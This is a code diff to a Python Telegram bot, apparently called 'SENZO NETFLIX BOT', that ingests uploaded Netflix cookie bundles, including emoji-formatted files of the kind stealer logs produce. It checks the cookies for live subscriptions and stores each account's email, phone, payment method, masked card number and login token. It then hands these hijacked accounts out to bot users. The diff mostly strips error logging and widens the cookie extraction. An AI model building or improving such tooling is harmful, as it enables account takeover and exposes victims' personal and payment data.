-            logger.error(f"AccountRepository.get_by_id error: {e}")
+        except Exception:
+            pass
         return None
 
     def get_available(self, plan_filter: Optional[str] = None) -> List[Account]:
@@ -2076,8 +2090,7 @@ class AccountRepository:
                 )
                 for r in rows
             ]
-        except Exception as e:
-            logger.error(f"AccountRepository.get_available error: {e}")
+        except Exception:
             return []
     
     def get_total(self) -> Dict[str, Union[int, Dict]]:
@@ -2091,8 +2104,7 @@ class AccountRepository:
             ''')
             plan_counts = {safe_str(r[0]): safe_int(r[1]) for r in cur.fetchall()}
             return {"total": total, "plans": plan_counts}
-        except Exception as e:
-            logger.error(f"AccountRepository.get_total error: {e}")
+        except Exception:
             return {"total": 0, "plans": {}}
     
     def assign(self, user_id: int) -> Optional[Account]:
@@ -2117,8 +2129,7 @@ class AccountRepository:
                 return account
             self.db.commit_sqlite()
             return None
-        except Exception as e:
-            logger.error(f"AccountRepository.assign error: {e}")
+        except Exception:
             return None
     
     def get_assigned(self, user_id: int) -> Optional[Account]:
@@ -2142,8 +2153,8 @@ class AccountRepository:
                     user_guid=safe_str(row[14]), phone=safe_str(row[15]), extra_member=safe_bool(row[16]),
                     membership_status=safe_str(row[17]), on_hold=safe_bool(row[18])
                 )
-        except Exception as e:
-            logger.error(f"AccountRepository.get_assigned error: {e}")
+        except Exception:
+            pass
         return None
     
     def release(self, account_id: int) -> bool:
@@ -2154,8 +2165,7 @@ class AccountRepository:
             ''', (account_id,))
             self.db.commit_sqlite()
             return True
-        except Exception as e:
-            logger.error(f"AccountRepository.release error: {e}")
+        except Exception:
             return False
     
     def delete(self, account_id: int) -> bool:
@@ -2163,8 +2173,7 @@ class AccountRepository:
             self.db.execute_sqlite('DELETE FROM accounts WHERE id = ?', (account_id,))
             self.db.commit_sqlite()
             return True
-        except Exception as e:
-            logger.error(f"AccountRepository.delete error: {e}")
+        except Exception:
             return False
     
     def clear_all(self, plan_filter: Optional[str] = None) -> int:
@@ -2175,8 +2184,7 @@ class AccountRepository:
                 cur = self.db.execute_sqlite('DELETE FROM accounts')
             self.db.commit_sqlite()
             return cur.rowcount
-        except Exception as e:
-            logger.error(f"AccountRepository.clear_all error: {e}")
+        except Exception:
             return 0
     
     def save_account(self, account_data: Dict) -> bool:
@@ -2227,7 +2235,7 @@ class AccountRepository:
             self.db.commit_sqlite()
             return True
         except Exception as e:
-            logger.error(f"AccountRepository.save_account error: {e}")
+            logger.error(f"save_account error: {e}")
             return False
     
     def save_batch(self, accounts: List[Dict]) -> int:
@@ -2264,8 +2272,7 @@ class ReportRepository:
             ''', (user_id,))
             self.db.commit_meta()
             return report_id
-        except Exception as e:
-            logger.error(f"ReportRepository.create error: {e}")
+        except Exception:
             return 0
     
     def get_pending(self) -> List[Dict]:
@@ -2287,8 +2294,7 @@ class ReportRepository:
                 }
                 for r in rows
             ]
-        except Exception as e:
-            logger.error(f"ReportRepository.get_pending error: {e}")
+        except Exception:
             return []
     
     def update_status(self, report_id: int, status: str, admin_id: int) -> bool:
@@ -2299,8 +2305,7 @@ class ReportRepository:
             ''', (status, admin_id, report_id))
             self.db.commit_meta()
             return True
-        except Exception as e:
-            logger.error(f"ReportRepository.update_status error: {e}")
+        except Exception:
             return False
     
     def get_by_id(self, report_id: int) -> Optional[Dict]:
@@ -2318,8 +2323,8 @@ class ReportRepository:
                     "status": row[5], "reported_at": row[6], "reviewed_at": row[7],
                     "admin_id": row[8], "channel_post_id": row[9]
                 }
-        except Exception as e:
-            logger.error(f"ReportRepository.get_by_id error: {e}")
+        except Exception:
+            pass
         return None
 
 class ChannelRepository:
@@ -2330,8 +2335,7 @@ class ChannelRepository:
         try:
             cur = self.db.execute_meta('SELECT channel_id, channel_name, invite_link FROM channels WHERE is_active = 1')
             return cur.fetchall()
-        except Exception as e:
-            logger.error(f"ChannelRepository.get_active error: {e}")
+        except Exception:
             return []
     
     def add(self, channel_id: str, channel_name: str, invite_link: str) -> bool:
@@ -2342,8 +2346,7 @@ class ChannelRepository:
             ''', (channel_id, channel_name, invite_link))
             self.db.commit_meta()
             return True
-        except Exception as e:
-            logger.error(f"ChannelRepository.add error: {e}")
+        except Exception:
             return False
     
     def remove(self, channel_id: int) -> bool:
@@ -2351,8 +2354,7 @@ class ChannelRepository:
             self.db.execute_meta('DELETE FROM channels WHERE id = ?', (channel_id,))
             self.db.commit_meta()
             return True
-        except Exception as e:
-            logger.error(f"ChannelRepository.remove error: {e}")
+        except Exception:
             return False
 
 class StatsRepository:
@@ -2367,8 +2369,7 @@ class StatsRepository:
             ''', (admin_id, file_name, total, valid))
             self.db.commit_meta()
             return True
-        except Exception as e:
-            logger.error(f"StatsRepository.log_stock error: {e}")
+        except Exception:
             return False
     
     def get_stock_logs(self, limit: int = 20) -> List[Dict]:
@@ -2385,8 +2386,7 @@ class StatsRepository:
                 }
                 for r in rows
             ]
-        except Exception as e:
-            logger.error(f"StatsRepository.get_stock_logs error: {e}")
+        except Exception:
             return []
     
     def log_daily(self, hits: int = 0, free: int = 0, bad: int = 0) -> bool:
@@ -2406,8 +2406,7 @@ class StatsRepository:
                 ''', (hits, free, bad))
             self.db.commit_meta()
             return True
-        except Exception as e:
-            logger.error(f"StatsRepository.log_daily error: {e}")
+        except Exception:
             return False
     
     def get_today(self) -> Dict[str, int]:
@@ -2416,12 +2415,12 @@ class StatsRepository:
             row = cur.fetchone()
             if row:
                 return {"hits": row[0] or 0, "free": row[1] or 0, "bad": row[2] or 0}
-        except Exception as e:
-            logger.error(f"StatsRepository.get_today error: {e}")
+        except Exception:
+            pass
         return {"hits": 0, "free": 0, "bad": 0}
 
 # ============================================================
-# BOT HANDLERS - COMPLETE
+# BOT HANDLERS
 # ============================================================
 
 class BotHandlers:
@@ -2451,8 +2450,8 @@ class BotHandlers:
                         return await query.message.reply_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
             elif update.message:
                 return await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
-        except Exception as e:
-            logger.error(f"_send_message error: {e}")
+        except Exception:
+            pass
         return None
     
     async def _check_force_sub(self, bot, user_id: int):
@@ -2491,10 +2490,6 @@ class BotHandlers:
         if user.accounts_used >= MAX_ACCOUNTS_PER_USER and not is_admin(user.user_id):
             return False, f"⚠️ Account limit reached! Max {MAX_ACCOUNTS_PER_USER} accounts."
         return True, ""
-    
-    # ============================================================
-    # USER HANDLERS
-    # ============================================================
     
     async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
@@ -2571,8 +2566,7 @@ class BotHandlers:
 👨‍💻 <b>Developer:</b> @Senzo268
 """
             await self._send_message(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
-        except Exception as e:
-            logger.error(f"start error: {e}")
+        except Exception:
             await self._send_message(update, "❌ An error occurred. Please try again later.")
     
     async def get_account_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -2671,8 +2665,7 @@ class BotHandlers:
             keyboard.append([InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")])
             
             await self._send_message(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
-        except Exception as e:
-            logger.error(f"get_account_callback error: {e}")
+        except Exception:
             await self._send_message(update, "❌ Error getting account. Please try again.")
     
     async def working_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -2712,8 +2705,7 @@ class BotHandlers:
                 "📸 <b>Please upload a screenshot proof now!</b>\n\n"
                 "👨‍💻 <b>Developer:</b> @Senzo268"
             )
-        except Exception as e:
-            logger.error(f"working_callback error: {e}")
+        except Exception:
             await self._send_message(update, "❌ Error starting report. Please try again.")
     
     async def notworking_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -2753,8 +2745,7 @@ class BotHandlers:
                 "📸 <b>Please upload a screenshot proof now!</b>\n\n"
                 "👨‍💻 <b>Developer:</b> @Senzo268"
             )
-        except Exception as e:
-            logger.error(f"notworking_callback error: {e}")
+        except Exception:
             await self._send_message(update, "❌ Error starting report. Please try again.")
     
     async def handle_screenshot(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -2801,8 +2792,7 @@ class BotHandlers:
                 await self._send_notworking_to_channel(context.bot, report_id, user_id, account_id, file_id)
             
             self.account_repo.release(account_id)
-        except Exception as e:
-            logger.error(f"handle_screenshot error: {e}")
+        except Exception:
             await update.message.reply_text("❌ Error processing your screenshot. Please try again.")
     
     async def my_status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -2841,8 +2831,7 @@ class BotHandlers:
             text += "\n\n👨‍💻 <b>Developer:</b> @Senzo268"
             keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]]
             await self._send_message(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
-        except Exception as e:
-            logger.error(f"my_status error: {e}")
+        except Exception:
             await self._send_message(update, "❌ Error loading status. Please try again.")
     
     async def contact_admin(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -2854,15 +2843,15 @@ class BotHandlers:
                 "📝 <b>CONTACT ADMIN</b>\n\nPlease type and send your message below. The admin team will reply to you directly!\n\n👨‍💻 <b>Developer:</b> @Senzo268",
                 reply_markup=InlineKeyboardMarkup(keyboard)
             )
-        except Exception as e:
-            logger.error(f"contact_admin error: {e}")
+        except Exception:
+            pass
     
     async def back_to_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             context.user_data.clear()
             await self.start(update, context)
-        except Exception as e:
-            logger.error(f"back_to_menu error: {e}")
+        except Exception:
+            pass
     
     async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
@@ -2888,12 +2877,8 @@ class BotHandlers:
                 [InlineKeyboardButton("🔙 Back", callback_data="back_menu")]
             ]
             await self._send_message(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
-        except Exception as e:
-            logger.error(f"stats_command error: {e}")
-    
-    # ============================================================
-    # ADMIN HANDLERS
-    # ============================================================
+        except Exception:
+            pass
     
     async def admin_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
@@ -2936,8 +2921,8 @@ class BotHandlers:
 👨‍💻 <b>Developer:</b> @Senzo268
 """
             await self._send_message(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
-        except Exception as e:
-            logger.error(f"admin_panel error: {e}")
+        except Exception:
+            pass
     
     async def admin_upload(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
@@ -2955,13 +2940,14 @@ class BotHandlers:
                 "📋 Supports: JSON, Netscape, Raw regex extraction\n"
                 "🔄 Auto-detects multiple cookie bundles per file\n"
                 "📊 Includes: Plan detection, profiles, payment info, NFToken\n"
-                "🧹 <b>NEW:</b> Auto-cleans corrupted cookies, URL-encoded values, and extracts from ANY format\n\n"
+                "🧹 <b>NEW:</b> Auto-cleans corrupted cookies, URL-encoded values, and extracts from ANY format\n"
+                "✅ <b>FIXED:</b> Now extracts from emoji-formatted files (📧 EMAIL:, 🍪 COOKIE:, etc.)\n\n"
                 "👨‍💻 <b>Developer:</b> @Senzo268",
                 reply_markup=InlineKeyboardMarkup(keyboard)
             )
             context.user_data["waiting_for_upload"] = True
-        except Exception as e:
-            logger.error(f"admin_upload error: {e}")
+        except Exception:
+            pass
     
     async def handle_file_upload(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
@@ -3001,8 +2987,7 @@ class BotHandlers:
                                     cookie_bundles.extend(bundles)
                                 except Exception:
                                     pass
-                except Exception as e:
-                    logger.error(f"Zip extract error: {e}")
+                except Exception:
                     await status_msg.edit_text("❌ Failed to parse ZIP file content.")
                     return
             else:
@@ -3027,6 +3012,8 @@ class BotHandlers:
             
             def check_bundle(bundle):
                 cookies_dict = bundle.get("cookies", {})
+                # Also pass info if available
+                info = bundle.get("info", {})
                 return NetflixService.check_account(cookies_dict)
 
             loop = asyncio.get_running_loop()
@@ -3041,22 +3028,26 @@ class BotHandlers:
                     processed += 1
                     try:
                         bundle, result = await future
-                    except Exception as exc:
-                        logger.error(f"check_bundle error: {exc}")
+                    except Exception:
                         continue
 
                     if result.get("valid") and result.get("subscribed"):
                         info = result.get("info", {})
+                        # Merge with bundle info if available
+                        bundle_info = bundle.get("info", {})
+                        if bundle_info:
+                            info.update(bundle_info)
+                        
                         cookies_dict = bundle.get("cookies", {})
                         cookie_text = NetflixService.get_cookie_text(cookies_dict)
-                        nftoken = result.get("nftoken")
-                        nftoken_expiry = result.get("nftoken_expiry")
+                        nftoken = result.get("nftoken") or cookies_dict.get("nftoken")
+                        nftoken_expiry = result.get("nftoken_expiry") or cookies_dict.get("nftoken_expiry")
 
                         with account_lock:
                             accounts.append({
-                                "email": safe_str(info.get("email")),
-                                "country": safe_str(info.get("countryOfSignup")),
-                                "plan": safe_str(info.get("localizedPlanName")),
+                                "email": safe_str(info.get("email") or cookies_dict.get("email")),
+                                "country": safe_str(info.get("countryOfSignup") or cookies_dict.get("country")),
+                                "plan": safe_str(info.get("localizedPlanName") or cookies_dict.get("plan")),
                                 "plan_key": result.get("plan_key", "unknown"),
                                 "plan_label": result.get("plan_label", "Unknown"),
                                 "cookies": cookie_text,
@@ -3071,9 +3062,9 @@ class BotHandlers:
                                 "member_since": format_member_since(info.get("memberSince")),
                                 "payment_method": safe_str(info.get("paymentMethodType")),
                                 "card_last4": safe_str(info.get("maskedCard")),
-                                "phone": normalize_phone_number(info.get("phoneNumber")),
+                                "phone": normalize_phone_number(info.get("phoneNumber") or cookies_dict.get("phone")),
                                 "extra_member": safe_bool(info.get("isExtraMemberAccount")),
-                                "membership_status": safe_str(info.get("membershipStatus")),
+                                "membership_status": safe_str(info.get("membershipStatus") or cookies_dict.get("membershipStatus")),
                                 "email_verified": safe_bool(info.get("emailVerified")),
                                 "profiles": safe_str(info.get("profiles")),
                                 "user_guid": safe_str(info.get("userGuid")),
@@ -3124,7 +3115,6 @@ class BotHandlers:
             context.user_data["waiting_for_upload"] = False
         except Exception as e:
             logger.error(f"handle_file_upload error: {e}")
-            traceback.print_exc()
             context.user_data["waiting_for_upload"] = False
             await update.message.reply_text("❌ Error processing file. Please try again.")
     
@@ -3160,8 +3150,8 @@ class BotHandlers:
                 (msg.message_id, report_id),
             )
             self.db.commit_meta()
-        except Exception as e:
-            logger.error(f"_send_working_to_channel error: {e}")
+        except Exception:
+            pass
 
     async def _send_notworking_to_channel(self, bot, report_id: int, user_id: int, account_id: int, file_id: str):
         if not REPORT_CHANNEL_ID:
@@ -3199,8 +3189,8 @@ class BotHandlers:
                 (msg.message_id, report_id),
             )
             self.db.commit_meta()
-        except Exception as e:
-            logger.error(f"_send_notworking_to_channel error: {e}")
+        except Exception:
+            pass
 
     async def _handle_broadcast_photo(self, update: Update, context: ContextTypes.DEFAULT_TYPE, file_id: str):
         user_id = update.effective_user.id
@@ -3681,11 +3671,12 @@ class BotHandlers:
 
 def main():
     print("=" * 70)
-    print("🎬 SENZO NETFLIX BOT - ULTIMATE EDITION v6.0")
+    print("🎬 SENZO NETFLIX BOT - ULTIMATE EDITION v7.0")
     print("🔥 Merged with Advanced Cookie Extraction Engine")
+    print("✅ Fixed: Emoji-formatted file extraction")
     print("=" * 70)
     if not ADMIN_IDS:
-        print("⚠️ ADMIN_IDS not set — admin panel will be unavailable until you set it.")
+        print("⚠️ ADMIN_IDS not set — admin panel will be unavailable.")
     print(f"🗄️ Users DB: {db.meta_backend()} | Accounts: {DATABASE_PATH}")
     print(f"👤 Admins: {ADMIN_IDS}")
     print(f"📢 Report Channel: {REPORT_CHANNEL_ID if REPORT_CHANNEL_ID else 'NOT SET'}")
@@ -3694,6 +3685,7 @@ def main():
     print("=" * 70)
     print("📋 FEATURES:")
     print("  ✅ Advanced Cookie Extraction (JSON/Netscape/Regex/Bundles)")
+    print("  ✅ Emoji-Formatted File Support (📧 EMAIL:, 🍪 COOKIE:, etc.)")
     print("  ✅ Auto-Cleans Corrupted & URL-Encoded Cookies")
     print("  ✅ GraphQL Account Parsing + Regex Fallback")
     print("  ✅ NFToken Generation with Expiry")
@@ -3724,7 +3716,6 @@ def main():
     handlers = BotHandlers()
     application = Application.builder().token(BOT_TOKEN).build()
     
-    # Command handlers
     application.add_handler(CommandHandler(["start", "help"], handlers.start))
     application.add_handler(CommandHandler(["get", "gen", "account"], handlers.get_account_callback))
     application.add_handler(CommandHandler(["status", "mystatus"], handlers.my_status))
@@ -3732,7 +3723,6 @@ def main():
     application.add_handler(CommandHandler(["contact"], handlers.contact_admin))
     application.add_handler(CommandHandler(["admin"], handlers.admin_panel))
     
-    # Callback handlers
     application.add_handler(CallbackQueryHandler(handlers.get_account_callback, pattern="^get_account$"))
     application.add_handler(CallbackQueryHandler(handlers.working_callback, pattern="^(working|report_working_)"))
     application.add_handler(CallbackQueryHandler(handlers.notworking_callback, pattern="^(notworking|report_notworking_)"))
@@ -3740,7 +3730,6 @@ def main():
     application.add_handler(CallbackQueryHandler(handlers.my_status, pattern="^my_status$"))
     application.add_handler(CallbackQueryHandler(handlers.back_to_menu, pattern="^back_menu$"))
     
-    # Admin callbacks
     application.add_handler(CallbackQueryHandler(handlers.admin_panel, pattern="^admin_panel$"))
     application.add_handler(CallbackQueryHandler(handlers.admin_stock_mgr, pattern="^(admin_stock_mgr|sm_filter_)"))
     application.add_handler(CallbackQueryHandler(handlers.delete_account_callback, pattern="^(del_acc_|clear_stock_)"))
@@ -3760,13 +3749,11 @@ def main():
     application.add_handler(CallbackQueryHandler(handlers.admin_stock_logs, pattern="^admin_stock_logs$"))
     application.add_handler(CallbackQueryHandler(handlers.admin_dashboard, pattern="^admin_dashboard$"))
     
-    # Channel action callbacks
     application.add_handler(CallbackQueryHandler(handlers.confirm_working_callback, pattern="^confirm_working_"))
     application.add_handler(CallbackQueryHandler(handlers.ban_user_callback, pattern="^ban_user_"))
     application.add_handler(CallbackQueryHandler(handlers.warn_user_callback, pattern="^warn_user_"))
     application.add_handler(CallbackQueryHandler(handlers.dismiss_report_callback, pattern="^dismiss_report_"))
     
-    # Message handlers
     application.add_handler(MessageHandler(filters.PHOTO, handlers.handle_screenshot))
     application.add_handler(MessageHandler(filters.Document.ALL, handlers.handle_file_upload))
     application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handlers.handle_text_messages))
